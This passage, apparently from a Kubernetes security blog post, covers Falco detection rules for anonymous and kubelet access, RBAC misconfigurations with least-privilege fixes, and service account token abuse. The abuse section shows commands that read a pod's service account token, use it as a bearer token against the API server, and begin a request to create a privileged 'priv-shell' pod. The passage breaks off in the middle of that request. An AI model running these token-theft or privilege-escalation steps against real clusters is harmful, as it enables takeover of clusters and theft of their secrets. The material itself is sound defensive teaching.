+  <span class="na">condition</span><span class="pi">:</span> <span class="pi">&gt;</span>
+    <span class="s">ka.user.name = "system:anonymous" and</span>
+    <span class="s">ka.response.code in (200, 201)</span>
+  <span class="na">output</span><span class="pi">:</span> <span class="s">Request by anonymous user allowed (user=%ka.user.name group=%ka.user.groups verb=%ka.verb uri=%ka.uri reason=%ka.auth.reason)</span>
+  <span class="na">priority</span><span class="pi">:</span> <span class="s">NOTICE</span>
+  <span class="na">source</span><span class="pi">:</span> <span class="s">k8s_audit</span>
+  <span class="na">tags</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">T1078</span><span class="pi">,</span> <span class="nv">access</span><span class="pi">,</span> <span class="nv">anonymous</span><span class="pi">]</span>
+
+<span class="pi">-</span> <span class="na">rule</span><span class="pi">:</span> <span class="s">Anonymous Request Failed</span>
+  <span class="na">desc</span><span class="pi">:</span> <span class="pi">&gt;</span>
+    <span class="s">Detect any request made by the anonymous user that was blocked. These often indicate reconnaissance or probing against the API server.</span>
+  <span class="na">condition</span><span class="pi">:</span> <span class="pi">&gt;</span>
+    <span class="s">ka.user.name = "system:anonymous" and </span>
+    <span class="s">ka.response.code in (401, 403) </span>
+  <span class="na">output</span><span class="pi">:</span> <span class="s">Request by anonymous user denied (user=%ka.user.name group=%ka.user.groups verb=%ka.verb uri=%ka.uri reason=%ka.auth.reason ips=%ka.sourceips userAgent=%ka.useragent)</span>
+  <span class="na">priority</span><span class="pi">:</span> <span class="s">NOTICE</span>
+  <span class="na">source</span><span class="pi">:</span> <span class="s">k8s_audit</span>
+  <span class="na">tags</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">T1078</span><span class="pi">,</span> <span class="nv">access</span><span class="pi">,</span> <span class="nv">anonymous</span><span class="pi">]</span>
+
+<span class="pi">-</span> <span class="na">rule</span><span class="pi">:</span> <span class="s">Anonymous Resource Access</span>
+  <span class="na">desc</span><span class="pi">:</span> <span class="pi">&gt;</span>
+    <span class="s">Detect anonymous attempts to read secrets, configmaps, pods, or RBAC objects.</span>
+  <span class="na">condition</span><span class="pi">:</span> <span class="pi">&gt;</span>
+    <span class="s">ka.user.name = "system:anonymous"</span>
+    <span class="s">and ka.verb in ("get", "list")</span>
+    <span class="s">and ka.target.resource in ("secrets", "configmaps", "pods", "serviceaccounts", "clusterroles", "clusterrolebindings")</span>
+  <span class="na">output</span><span class="pi">:</span> <span class="pi">&gt;</span>
+    <span class="s">Anonymous user accessed sensitive resources (user=%ka.user.name group=%ka.user.groups verb=%ka.verb uri=%ka.uri reason=%ka.auth.reason ips=%ka.sourceips userAgent=%ka.useragent)</span>
+  <span class="na">priority</span><span class="pi">:</span> <span class="s">WARNING</span>
+  <span class="na">source</span><span class="pi">:</span> <span class="s">k8s_audit</span>
+  <span class="na">tags</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">T1613</span><span class="pi">,</span> <span class="nv">anonymous</span><span class="pi">,</span> <span class="nv">secrets</span><span class="pi">]</span>
+
+<span class="pi">-</span> <span class="na">rule</span><span class="pi">:</span> <span class="s">Anonymous Pod Creation Attempt</span>
+  <span class="na">desc</span><span class="pi">:</span> <span class="s">Detect attempts by system:anonymous to create or modify pods.</span>
+  <span class="na">condition</span><span class="pi">:</span> <span class="pi">&gt;</span>
+    <span class="s">ka.verb in ("create", "update", "patch") and</span>
+    <span class="s">ka.user.name="system:anonymous" and</span>
+    <span class="s">ka.target.resource=pods</span>
+  <span class="na">output</span><span class="pi">:</span> <span class="pi">&gt;</span>
+    <span class="s">Anonymous workload mutation attempt (verb=%ka.verb resource=%ka.target.resource name=%ka.target.name ns=%ka.target.namespace from=%ka.sourceips reason=%ka.auth.reason uri=%ka.uri userAgent=%ka.useragent reason=%ka.auth.reason)</span>
+  <span class="na">priority</span><span class="pi">:</span> <span class="s">CRITICAL</span>
+  <span class="na">source</span><span class="pi">:</span> <span class="s">k8s_audit</span>
+  <span class="na">tags</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">T1610</span><span class="pi">,</span> <span class="nv">privilege-escalation</span><span class="pi">,</span> <span class="nv">execution</span><span class="pi">]</span>
+
+<span class="c1"># Kubelet</span>
+<span class="pi">-</span> <span class="na">rule</span><span class="pi">:</span> <span class="s">Kubelet Remote Exec Attempt</span>
+  <span class="na">desc</span><span class="pi">:</span> <span class="s">Detect attempts to execute commands inside a container through the kubelet API</span>
+  <span class="na">condition</span><span class="pi">:</span> <span class="pi">&gt;</span>
+    <span class="s">evt.type = execve and</span>
+    <span class="s">proc.name in ("curl", "kubeletctl") and</span>
+    <span class="s">((proc.cmdline contains "exec" or proc.cmdline contains "run") or (proc.cmdline contains "/run/" or proc.cmdline contains "/exec")) and</span>
+    <span class="s">not user.name contains "kubelet"</span>
+  <span class="na">output</span><span class="pi">:</span> <span class="pi">&gt;</span>
+    <span class="s">Potential remote exec via kubelet API (cmd=%proc.cmdline user=%user.name container=%container.name)</span>
+  <span class="na">priority</span><span class="pi">:</span> <span class="s">WARNING</span>
+  <span class="na">tags</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">T1204</span><span class="pi">,</span> <span class="nv">kubelet</span><span class="pi">,</span> <span class="nv">rce</span><span class="pi">,</span> <span class="nv">lateral-movement</span><span class="pi">]</span>
+
+<span class="pi">-</span> <span class="na">rule</span><span class="pi">:</span> <span class="s">Anonymous Kubelet API Enumeration</span>
+  <span class="na">desc</span><span class="pi">:</span> <span class="s">Detect unauthenticated enumeration via kubelet API</span>
+  <span class="na">condition</span><span class="pi">:</span> <span class="pi">&gt;</span>
+    <span class="s">evt.type=connect and</span>
+    <span class="s">(fd.typechar=4 or fd.typechar=6) and</span>
+    <span class="s">fd.sport = 10250</span>
+  <span class="na">output</span><span class="pi">:</span> <span class="pi">&gt;</span>
+    <span class="s">Suspicious kubelet enumeration | connection=%fd.name lport=%fd.lport rport=%fd.rport fd_type=%fd.type fd_proto=%fd.l4proto evt_type=%evt.type user=%user.name user_uid=%user.uid user_loginuid=%user.loginuid process=%proc.name proc_exepath=%proc.exepath parent=%proc.pname command=%proc.cmdline terminal=%proc.tty</span>
+  <span class="na">priority</span><span class="pi">:</span> <span class="s">WARNING</span>
+  <span class="na">tags</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">T1613</span><span class="pi">,</span> <span class="nv">kubelet</span><span class="pi">,</span> <span class="nv">reconnaissance</span><span class="pi">]</span>
+</code></pre></div></div>
+
+<h3 id="overly-permissive-role-based-access-control"><strong>Overly Permissive Role-based Access Control</strong></h3>
+
+<h4 id="understanding-rbac-in-kubernetes">Understanding RBAC in Kubernetes</h4>
+
+<p>Kubernetes RBAC is the primary authorization <a href="https://kubernetes.io/docs/reference/access-authn-authz/rbac/">method of regulating access to resources</a> based on the roles of individual users.</p>
+
+<p>When properly configured, RBAC serves as a powerful security tool that prevents unauthorized users from performing sensitive operations. That being said, RBAC misconfigurations remain one of the most common vulnerabilities in Kubernetes clusters. Overly broad permissions create pathways for privilege escalation, lateral movement, and cluster compromise.</p>
+
+<h4 id="rbac-components">RBAC Components</h4>
+
+<p>Understanding how RBAC works requires familiarity with four core components that work together to define and grant permissions:</p>
+
+<ul>
+  <li>Role</li>
+  <li>Cluster Role</li>
+  <li>RoleBinding</li>
+  <li>ClusterRoleBinding</li>
+</ul>
+
+<p>Roles define permissions within a specific namespace.</p>
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">apiVersion</span><span class="pi">:</span> <span class="s">rbac.authorization.k8s.io/v1</span>  
+<span class="na">kind</span><span class="pi">:</span> <span class="s">Role</span>  
+<span class="na">metadata</span><span class="pi">:</span>  
+  <span class="na">namespace</span><span class="pi">:</span> <span class="s">default</span>  
+  <span class="na">name</span><span class="pi">:</span> <span class="s">pod-reader</span>  
+<span class="na">rules</span><span class="pi">:</span>  
+<span class="pi">-</span> <span class="na">apiGroups</span><span class="pi">:</span> <span class="pi">[</span><span class="s2">"</span><span class="s">"</span><span class="pi">]</span> <span class="c1"># "" indicates the core API group  </span>
+  <span class="na">resources</span><span class="pi">:</span> <span class="pi">[</span><span class="s2">"</span><span class="s">pods"</span><span class="pi">]</span>  
+  <span class="na">verbs</span><span class="pi">:</span> <span class="pi">[</span><span class="s2">"</span><span class="s">get"</span><span class="pi">,</span> <span class="s2">"</span><span class="s">watch"</span><span class="pi">,</span> <span class="s2">"</span><span class="s">list"</span><span class="pi">]</span>  
+</code></pre></div></div>
+<p>This Role allows read-only access to pods in the <code class="language-plaintext highlighter-rouge">production</code> namespace only. Users with this Role cannot modify pods or access resources in other namespaces.</p>
+
+<p>ClusterRoles work similarly to Roles, but apply cluster-wide including non-namespaced resources like nodes:</p>
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">apiVersion</span><span class="pi">:</span> <span class="s">rbac.authorization.k8s.io/v1</span>  
+<span class="na">kind</span><span class="pi">:</span> <span class="s">ClusterRole</span>  
+<span class="na">metadata</span><span class="pi">:</span>  
+  <span class="na">name</span><span class="pi">:</span> <span class="s">secret-reader</span>  
+<span class="na">rules</span><span class="pi">:</span>  
+<span class="pi">-</span> <span class="na">apiGroups</span><span class="pi">:</span> <span class="pi">[</span><span class="s2">"</span><span class="s">"</span><span class="pi">]</span>  
+  <span class="na">resources</span><span class="pi">:</span> <span class="pi">[</span><span class="s2">"</span><span class="s">secrets"</span><span class="pi">]</span>  
+  <span class="na">verbs</span><span class="pi">:</span> <span class="pi">[</span><span class="s2">"</span><span class="s">get"</span><span class="pi">,</span> <span class="s2">"</span><span class="s">list"</span><span class="pi">]</span>  
+</code></pre></div></div>
+<p>This ClusterRole grants read access to Secrets across the entire cluster.</p>
+
+<p>RoleBindings grant permissions defined in a Role to users, groups, or service accounts in a namespace.</p>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">apiVersion</span><span class="pi">:</span> <span class="s">rbac.authorization.k8s.io/v1</span>  
+<span class="na">kind</span><span class="pi">:</span> <span class="s">RoleBinding</span>  
+<span class="na">metadata</span><span class="pi">:</span>  
+  <span class="na">name</span><span class="pi">:</span> <span class="s">read-pods-binding</span>  
+  <span class="na">namespace</span><span class="pi">:</span> <span class="s">default</span>  
+<span class="na">subjects</span><span class="pi">:</span>  
+<span class="pi">-</span> <span class="na">kind</span><span class="pi">:</span> <span class="s">ServiceAccount</span>  
+  <span class="na">name</span><span class="pi">:</span> <span class="s">app-monitor</span>  
+  <span class="na">namespace</span><span class="pi">:</span> <span class="s">production</span>  
+<span class="na">roleRef</span><span class="pi">:</span>  
+  <span class="na">kind</span><span class="pi">:</span> <span class="s">Role</span>  
+  <span class="na">name</span><span class="pi">:</span> <span class="s">pod-reader</span>  
+  <span class="na">apiGroup</span><span class="pi">:</span> <span class="s">rbac.authorization.k8s.io</span>  
+</code></pre></div></div>
+
+<p>ClusterRoleBindings grant permissions defined in a ClusterRole across the entire cluster.</p>
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">apiVersion</span><span class="pi">:</span> <span class="s">rbac.authorization.k8s.io/v1</span>  
+<span class="na">kind</span><span class="pi">:</span> <span class="s">ClusterRoleBinding</span>  
+<span class="na">metadata</span><span class="pi">:</span>  
+  <span class="na">name</span><span class="pi">:</span> <span class="s">read-secrets-global</span>  
+<span class="na">subjects</span><span class="pi">:</span>  
+<span class="pi">-</span> <span class="na">kind</span><span class="pi">:</span> <span class="s">User</span>  
+  <span class="na">name</span><span class="pi">:</span> <span class="s">security-auditor</span>  
+  <span class="na">apiGroup</span><span class="pi">:</span> <span class="s">rbac.authorization.k8s.io</span>  
+<span class="na">roleRef</span><span class="pi">:</span>  
+  <span class="na">kind</span><span class="pi">:</span> <span class="s">ClusterRole</span>  
+  <span class="na">name</span><span class="pi">:</span> <span class="s">secret-reader</span>  
+  <span class="na">apiGroup</span><span class="pi">:</span> <span class="s">rbac.authorization.k8s.io</span>  
+</code></pre></div></div>
+
+<h5 id="cluster-admin">Cluster-admin</h5>
+
+<p>The <code class="language-plaintext highlighter-rouge">cluster-admin</code> ClusterRole grants unrestricted access to all cluster resources. Binding this role to service accounts or users is incredibly risky. <code class="language-plaintext highlighter-rouge">cluster-admin</code> can create, modify, and delete resources in any namespace, it can read all secrets, modify RBAC policies, and more.</p>
+
+<p>You can audit <code class="language-plaintext highlighter-rouge">cluster-admin</code> usage by tracking which subjects are bound to the ClusterRole.</p>
+
+<p><code class="language-plaintext highlighter-rouge">kubectl get clusterrolebindings -o wide | grep cluster-admin</code></p>
+
+<p><img src="/img/kubernetes/kube-images/03-rbac/01-caaudit.png" alt="image17" width="720" class="mx-auto d-block" /></p>
+
+<h5 id="wildcards-and-verb-permissions">Wildcards and Verb Permissions</h5>
+<p>Wildcard RBAC rules are typically implemented for pure convenience. But carelessly leaving them around can lead to cluster-wide takeover.</p>
+
+<p>Wildcard resources:</p>
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">apiVersion</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">rbac.authorization.k8s.io/v1</span><span class="pi">]</span><span class="s">(http://rbac.authorization.k8s.io/v1)</span>  
+<span class="s">kind:ClusterRole</span>  
+<span class="na">rules</span><span class="pi">:</span>  
+<span class="pi">-</span> <span class="na">apiGroups</span><span class="pi">:</span> <span class="pi">[</span><span class="s2">"</span><span class="s">*"</span><span class="pi">]</span>  
+  <span class="na">resources</span><span class="pi">:</span> <span class="pi">[</span><span class="s2">"</span><span class="s">*"</span><span class="pi">]</span>  <span class="c1"># Access to everything  </span>
+  <span class="na">verbs</span><span class="pi">:</span> <span class="pi">[</span><span class="s2">"</span><span class="s">get"</span><span class="pi">,</span> <span class="s2">"</span><span class="s">list"</span><span class="pi">]</span>  
+</code></pre></div></div>
+<p>This RBAC configuration would allow an attacker to <code class="language-plaintext highlighter-rouge">get</code> and <code class="language-plaintext highlighter-rouge">list</code> any API resource within the cluster.</p>
+
+<p>Wildcard verbs:</p>
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">rules</span><span class="pi">:</span>  
+<span class="pi">-</span> <span class="na">apiGroups</span><span class="pi">:</span> <span class="pi">[</span><span class="s2">"</span><span class="s">"</span><span class="pi">]</span>  
+  <span class="na">resources</span><span class="pi">:</span> <span class="pi">[</span><span class="s2">"</span><span class="s">pods"</span><span class="pi">]</span>  
+  <span class="na">verbs</span><span class="pi">:</span> <span class="pi">[</span><span class="s2">"</span><span class="s">*"</span><span class="pi">]</span>  <span class="c1"># All operations including delete  </span>
+</code></pre></div></div>
+<p>When verbs are wildcarded, it means that a principal might be able to create pods, update configurations, list secrets, and more.</p>
+
+<p>In particular roles with the <code class="language-plaintext highlighter-rouge">escalate</code> and <code class="language-plaintext highlighter-rouge">bind</code> verb allows privilege escalation. For example if a service account has:</p>
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">verbs</span><span class="pi">:</span> <span class="pi">[</span><span class="s2">"</span><span class="s">bind"</span><span class="pi">]</span>  
+<span class="na">resources</span><span class="pi">:</span> <span class="pi">[</span><span class="s2">"</span><span class="s">clusterroles"</span><span class="pi">]</span>  
+</code></pre></div></div>
+<p>They can escalate to cluster-admin because the <code class="language-plaintext highlighter-rouge">escalate</code> permission allows the modification of RBAC roles beyond the service account’s own permissions.</p>
+
+<p>To see how attackers use this in practice, in a honeypot analyzed by <a href="https://www.aquasec.com/blog/leveraging-kubernetes-rbac-to-backdoor-clusters/">Aqua Security Researchers</a>, attackers leveraged a misconfigured API server that allowed anonymous requests. They used RBAC to gain persistence by creating a privileged ClusterRole named <code class="language-plaintext highlighter-rouge">kube-controller</code> and a ServiceAccount in the <code class="language-plaintext highlighter-rouge">kube-system</code> namespace. The attacker then created a ClusterRoleBinding, binding the ClusterRole to ServiceAccount. After establishing persistence, the attacker then creates a DaemonSet to deploy containers with a cryptomining binary, effectively hijacking the resources of the cluster.</p>
+
+<p><img src="/img/kubernetes/kube-images/03-rbac/02-rbac-buster.png" alt="image18" width="720" class="mx-auto d-block" /></p>
+
+<p>Let’s take a look at another example. Let’s say there is a service account in a dev namespace.</p>
+
+<p>An attacker who gets command execution in a pod in that namespace, begins enumerating the pod and is able to steal the service account token and certificate authority key.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> /var/run/secrets/kubernetes.io/serviceaccount/token  
+</code></pre></div></div>
+<p><img src="/img/kubernetes/kube-images/03-rbac/03-obs-token.png" alt="image19" width="720" class="mx-auto d-block" /></p>
+
+<p>Able to authenticate as the service account, the attacker can now list secrets.</p>
+
+<p><img src="/img/kubernetes/kube-images/03-rbac/04-token-whoami.png" alt="image20" width="720" class="mx-auto d-block" /></p>
+
+<p><img src="/img/kubernetes/kube-images/03-rbac/05-secrets.png" alt="image21" width="720" class="mx-auto d-block" /></p>
+
+<p>Secrets by default are encoded with base64 and can be easily deciphered, revealing these credentials: <code class="language-plaintext highlighter-rouge">admin:SuperSecretPassword123!</code>.</p>
+
+<p><img src="/img/kubernetes/kube-images/03-rbac/06-listassa.png" alt="image22" width="720" class="mx-auto d-block" /></p>
+
+<p>Depending on the permissions of the ServiceAccount, attackers could also patch deployments, create pods running privileged containers, create CronJobs, install backdoors, spin up cryptominers, and more.</p>
+
+<h4 id="defensive-strategies">Defensive Strategies</h4>
+
+<h5 id="implement-least-privilege">Implement Least Privilege</h5>
+
+<p>Least privilege should be implemented whenever possible. Below is an example of a properly scoped role:</p>
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">apiVersion</span><span class="pi">:</span> <span class="s">rbac.authorization.k8s.io/v1</span>  
+<span class="na">kind</span><span class="pi">:</span> <span class="s">Role</span>  
+<span class="na">metadata</span><span class="pi">:</span>  
+  <span class="na">name</span><span class="pi">:</span> <span class="s">pod-log-reader</span>  
+<span class="na">rules</span><span class="pi">:</span>  
+<span class="pi">-</span> <span class="na">apiGroups</span><span class="pi">:</span> <span class="pi">[</span><span class="s2">"</span><span class="s">"</span><span class="pi">]</span>  
+  <span class="na">resources</span><span class="pi">:</span>  
+    <span class="pi">-</span> <span class="s">pods</span>  
+    <span class="pi">-</span> <span class="s">pods/log</span>  
+    <span class="pi">-</span> <span class="s">pods/status</span>  
+  <span class="na">verbs</span><span class="pi">:</span> <span class="pi">[</span><span class="s2">"</span><span class="s">get"</span><span class="pi">,</span> <span class="s2">"</span><span class="s">list"</span><span class="pi">]</span>  
+</code></pre></div></div>
+<p>This role is only permitted to <code class="language-plaintext highlighter-rouge">get pods</code> and view a pod’s logs.</p>
+
+<p>To further reduce the potential impact of a compromised Role, avoid using ClusterRoles unless absolutely necessary. It should also be noted that ClusterRoleBinding to a namespaced ServiceAccount is always cluster-wide.</p>
+
+<h4 id="rbac-detections">RBAC Detections</h4>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="pi">-</span> <span class="na">rule</span><span class="pi">:</span> <span class="s">ClusterRole Binding To Anonymous User</span>
+  <span class="na">desc</span><span class="pi">:</span> <span class="s">Detect attempts to bind ClusterRoles to anonymous users</span>
+  <span class="na">condition</span><span class="pi">:</span> <span class="pi">&gt;</span>
+    <span class="s">ka.target.resource=clusterrolebindings and</span>
+    <span class="s">ka.verb=create and </span>
+    <span class="s">(ka.req.binding.subjects.user_names intersects ("system:unauthenticated", "system:anonymous"))</span>
+  <span class="na">output</span><span class="pi">:</span> <span class="s">Cluster Role Binding to anonymous user (user=%ka.user.name subject=%ka.req.binding.subjects)</span>
+  <span class="na">priority</span><span class="pi">:</span> <span class="s">WARNING</span> 
+  <span class="na">tags</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">T1098.006</span><span class="pi">,</span> <span class="nv">rbac</span><span class="pi">,</span> <span class="nv">access-control</span><span class="pi">,</span> <span class="nv">persistence</span><span class="pi">]</span>
+  <span class="na">source</span><span class="pi">:</span> <span class="s">k8s_audit</span>
+
+<span class="pi">-</span> <span class="na">rule</span><span class="pi">:</span> <span class="s">ClusterRole Binding To Cluster Admin</span>
+  <span class="na">desc</span><span class="pi">:</span> <span class="s">Detect attempts to bind ClusterRoles to anonymous users</span>
+  <span class="na">condition</span><span class="pi">:</span> <span class="pi">&gt;</span>
+    <span class="s">ka.target.resource in ("rolebindings", "clusterrolebindings") and </span>
+    <span class="s">ka.verb=create and </span>
+    <span class="s">ka.req.binding.role=cluster-admin</span>
+  <span class="na">output</span><span class="pi">:</span> <span class="s">Cluster Role Binding to Cluster Admin (user=%ka.user.name subject=%ka.req.binding.subjects)</span>
+  <span class="na">priority</span><span class="pi">:</span> <span class="s">WARNING</span> 
+  <span class="na">tags</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">T1098.006</span><span class="pi">,</span> <span class="nv">rbac</span><span class="pi">,</span> <span class="nv">access-control</span><span class="pi">,</span> <span class="nv">persistence</span><span class="pi">]</span>
+  <span class="na">source</span><span class="pi">:</span> <span class="s">k8s_audit</span>
+
+<span class="pi">-</span> <span class="na">rule</span><span class="pi">:</span> <span class="s">RBAC Wildcard Permissions Detected</span>
+  <span class="na">desc</span><span class="pi">:</span> <span class="s">Detect creation or update of RBAC roles with wildcard verbs or resources</span>
+  <span class="na">condition</span><span class="pi">:</span> <span class="pi">&gt;</span>
+    <span class="s">ka.target.resource in ("roles", "clusterroles") and</span>
+    <span class="s">ka.verb in (create, update, patch) and</span>
+    <span class="s">(</span>
+      <span class="s">ka.req.role.rules.resources intersects ("*") or</span>
+      <span class="s">ka.req.role.rules.verbs intersects ("*")</span>
+    <span class="s">)</span>
+  <span class="na">output</span><span class="pi">:</span> <span class="pi">&gt;</span>
+    <span class="s">RBAC wildcard detected: %ka.user.name modified %ka.target.resource with wildcard permissions</span>
+  <span class="na">priority</span><span class="pi">:</span> <span class="s">CRITICAL</span>
+  <span class="na">source</span><span class="pi">:</span> <span class="s">k8s_audit</span>
+  <span class="na">tags</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">misconfiguration</span><span class="pi">,</span> <span class="nv">rbac</span><span class="pi">,</span> <span class="nv">access-control</span><span class="pi">,</span> <span class="nv">persistence</span><span class="pi">]</span>
+
+<span class="pi">-</span> <span class="na">rule</span><span class="pi">:</span> <span class="s">Namespaced SA Bound to ClusterRole</span>
+  <span class="na">desc</span><span class="pi">:</span> <span class="s">Detect RoleBindings that bind a ServiceAccount to a ClusterRole</span>
+  <span class="na">condition</span><span class="pi">:</span> <span class="pi">&gt;</span>
+    <span class="s">ka.target.resource in ("rolebindings", "clusterrolebindings") and</span>
+    <span class="s">ka.verb=create and</span>
+    <span class="s">(len(ka.req.binding.subjects.serviceaccount_names) &gt; 0 or len(ka.req.binding.subjects.serviceaccount_ns_names) &gt; 0) and</span>
+    <span class="s">ka.req.binding.role exists</span>
+  <span class="na">output</span><span class="pi">:</span> <span class="pi">&gt;</span>
+    <span class="s">Potential privilege escalation: %ka.user.name bound SA %ka.req.binding.subjects.name to ClusterRole %ka.req.binding.role</span>
+  <span class="na">priority</span><span class="pi">:</span> <span class="s">WARNING</span>
+  <span class="na">source</span><span class="pi">:</span> <span class="s">k8s_audit</span>
+  <span class="na">tags</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">T1098.006</span><span class="pi">,</span> <span class="nv">rbac</span><span class="pi">,</span> <span class="nv">access-control</span><span class="pi">,</span> <span class="nv">persistence</span><span class="pi">,</span> <span class="nv">privilege-escalation</span><span class="pi">]</span>
+</code></pre></div></div>
+
+<h3 id="service-account-token-abuse"><strong>Service Account Token Abuse</strong></h3>
+
+<p>Service accounts in Kubernetes are essentially machine identities. Service accounts are meant for pods or controllers that need to interact with the Kubernetes API. Typically they are used for things like reporting metrics, watching resources, or in CI/CD pipelines running inside the cluster. Every namespace has a default service account which is mounted to every pod launched unless configured otherwise.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl get serviceaccount default <span class="nt">-n</span> default <span class="nt">-o</span> yaml  
+</code></pre></div></div>
+<p><img src="/img/kubernetes/kube-images/04-serviceaccount/01-default-sa.png" alt="image23" width="720" class="mx-auto d-block" /></p>
+
+<p>The default namespace service account has no permissions attached to it other than basic discovery commands. It is virtually harmless unless it is bound to a Role or ClusterRole.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl auth can-i <span class="nt">--as</span> system:serviceaccount:default:default <span class="nt">--list</span>  
+</code></pre></div></div>
+<p><img src="/img/kubernetes/kube-images/04-serviceaccount/02-defaultsaperms.png" alt="image24" width="720" class="mx-auto d-block" /></p>
+
+<p>If an administrator were to grant a service account broad permissions then every pod in the namespace also inherits those permissions.This is especially important when you consider that many attackers are able to get initial access in a cluster through an application vulnerability which grants remote code execution on a pod.</p>
+
+<p>Rather than authenticating to the API with client certificates, service accounts use tokens.</p>
+
+<h4 id="understanding-service-account-tokens">Understanding Service Account Tokens</h4>
+
+<p>A service account token is a JSON Web Token (JWT) that looks something like this:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl <span class="nb">exec</span> <span class="nt">-it</span> &lt;pod&gt; <span class="nt">--</span> <span class="nb">cat</span> /var/run/secrets/[kubernetes.io/serviceaccount/token]<span class="o">(</span>http://kubernetes.io/serviceaccount/token<span class="o">)</span>
+
+<span class="nv">TOKEN</span><span class="o">=</span><span class="si">$(</span>kubectl <span class="nb">exec</span> &lt;pod&gt; <span class="nt">--</span> <span class="nb">cat</span> /var/run/secrets/kubernetes.io/serviceaccount/token<span class="si">)</span>  
+<span class="nb">echo</span> <span class="nv">$TOKEN</span> | <span class="nb">cut</span> <span class="nt">-d</span><span class="nb">.</span> <span class="nt">-f2</span> | <span class="nb">base64</span> <span class="nt">-d</span> | jq  
+</code></pre></div></div>
+
+<p><img src="/img/kubernetes/kube-images/04-serviceaccount/03-exampletoken.png" alt="image25" width="720" class="mx-auto d-block" /></p>
+
+<p><img src="/img/kubernetes/kube-images/04-serviceaccount/04-decodedtoken.png" alt="image26" /> {: width=”720” .mx-auto .d-block }</p>
+
+<p>Whenever a pod starts, the kubelet mounts the service account token into the pod. Applications can then use the mounted token to authenticate with the API just like a user would with <code class="language-plaintext highlighter-rouge">kubectl</code>.</p>
+
+<p>There are two types of tokens that Kubernetes supports after version 1.22: Long-Lived Tokens and Time Bound Tokens.</p>
+
+<p>Long-Lived Tokens work as you would expect. These tokens never expire. This used to be the default type of token for service accounts.</p>
+
+<p>Time Bound tokens by default expire after an hour. This type of token is generated whenever the <code class="language-plaintext highlighter-rouge">TokenRequest</code> API is called. Pods still read tokens <code class="language-plaintext highlighter-rouge">/var/run/secrets/kubernetes.io/serviceaccount/token</code> but they are not stored in <code class="language-plaintext highlighter-rouge">ETCD</code> as secrets.</p>
+
+<p>Although Kubernetes recommends Time Bound tokens, there are still legitimate use cases for a Long-Lived Token. Continuous Integration/Continuous Deployment (CI/CD) pipelines might use a service account token.</p>
+
+<p>If an attacker gets code execution in a pod, they are then able to read the service account token. Once they have the token, they can access the API Server under the token’s context:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">TOKEN</span><span class="o">=</span><span class="si">$(</span><span class="nb">cat</span> /var/run/secrets/[kubernetes.io/serviceaccount/token]<span class="o">(</span>http://kubernetes.io/serviceaccount/token<span class="o">)</span><span class="si">)</span>  
+<span class="nv">API</span><span class="o">=</span><span class="s2">"https://kubernetes.default.svc"</span>  
+curl <span class="nt">-sk</span> <span class="se">\ </span> 
+  <span class="nt">-H</span> <span class="s2">"Authorization: Bearer </span><span class="nv">$TOKEN</span><span class="s2">"</span> <span class="se">\ </span> 
+  <span class="nv">$API</span>/api  
+</code></pre></div></div>
+
+<p><img src="/img/kubernetes/kube-images/04-serviceaccount/05-api-token-test.png" alt="image27" width="720" class="mx-auto d-block" /></p>
+
+<p>For this scenario, the service account attached to this pod has the following permissions:</p>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">rules</span><span class="pi">:</span>  
+<span class="pi">-</span> <span class="na">apiGroups</span><span class="pi">:</span> <span class="pi">[</span><span class="s2">"</span><span class="s">"</span><span class="pi">,</span> <span class="s2">"</span><span class="s">apps"</span><span class="pi">,</span> <span class="s2">"</span><span class="s">batch"</span><span class="pi">]</span>  
+  <span class="na">resources</span><span class="pi">:</span> <span class="pi">[</span><span class="s2">"</span><span class="s">pods"</span><span class="pi">,</span> <span class="s2">"</span><span class="s">deployments"</span><span class="pi">,</span> <span class="s2">"</span><span class="s">cronjobs"</span><span class="pi">]</span>  
+  <span class="na">verbs</span><span class="pi">:</span> <span class="pi">[</span><span class="s2">"</span><span class="s">get"</span><span class="pi">,</span> <span class="s2">"</span><span class="s">list"</span><span class="pi">,</span> <span class="s2">"</span><span class="s">watch"</span><span class="pi">,</span> <span class="s2">"</span><span class="s">create"</span><span class="pi">,</span> <span class="s2">"</span><span class="s">update"</span><span class="pi">,</span> <span class="nv">“exec”</span><span class="pi">]</span>  
+</code></pre></div></div>
+
+<p>Using this an attacker could create a pod running a privileged container.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-k</span> <span class="nt">-X</span> POST <span class="se">\ </span> 
+  <span class="nt">-H</span> <span class="s2">"Authorization: Bearer </span><span class="nv">$TOKEN</span><span class="s2">"</span> <span class="se">\ </span> 
+  <span class="nt">-H</span> <span class="s2">"Content-Type: application/json"</span> <span class="se">\ </span> 
+  <span class="nt">-d</span> <span class="s1">'{  
+    "apiVersion": "v1",  
+    "kind": "Pod",  
+    "metadata": {  
+      "name": "priv-shell"  
+    },  
